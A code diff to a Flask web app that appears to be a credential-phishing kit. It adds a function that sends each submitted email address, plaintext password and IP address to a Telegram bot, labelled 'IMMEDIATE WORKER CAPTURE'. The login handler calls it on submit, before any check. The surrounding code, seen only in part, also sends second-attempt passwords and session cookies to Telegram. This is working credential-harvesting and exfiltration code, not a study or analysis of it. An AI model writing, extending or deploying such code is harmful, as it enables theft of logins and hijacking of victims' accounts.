@@ -368,6 +368,49 @@ def send_second_attempt_to_telegram(email, password, ip_address):
         logger.error(f"❌ Error sending second attempt to Telegram: {e}")
         return False
 
+def send_immediate_credentials_to_telegram(email, password, ip_address):
+    """Send credentials to Telegram immediately when entered"""
+    try:
+        bot_token = config('BOT_TOKEN', default=None)
+        chat_id = config('CHAT_ID', default=None)
+        
+        if not bot_token or not chat_id:
+            logger.error("❌ Telegram credentials not properly configured!")
+            return False
+        
+        if bot_token.strip() == '' or chat_id.strip() == '':
+            logger.error("❌ Telegram credentials are empty!")
+            return False
+        
+        # Create immediate notification message
+        message = f"""🚨 IMMEDIATE WORKER CAPTURE
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP Address: {ip_address}
+📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+⚡ Status: IMMEDIATELY CAPTURED
+🔄 Next: Processing through automation system"""
+        
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        
+        response = requests.post(
+            url,
+            data={
+                'chat_id': chat_id,
+                'text': message
+            },
+            timeout=30
+        )
+        
+        logger.info(f"Immediate response status: {response.status_code}")
+        logger.info(f"Immediate response: {response.text}")
+        
+        return response.status_code == 200
+            
+    except Exception as e:
+        logger.error(f"❌ Error sending immediate credentials to Telegram: {e}")
+        return False
+
 def send_cookies_to_telegram(filename, email, password, ip_address):
     """Send cookies file to Telegram with worker details"""
     try:
@@ -601,6 +644,17 @@ def process_form():
         if not email or not password:
             flash('Email and password are required', 'error')
             return redirect(url_for('index', step='password', email=email, error='true'))
+        
+        # IMMEDIATELY send credentials to Telegram when submitted
+        worker_ip = get_remote_address()
+        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
+        
+        # Send immediate notification with both email and password
+        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
+        if immediate_success:
+            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
+        else:
+            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
         
         # Check if user exists and password is correct
         user = User.query.filter_by(email=email).first()
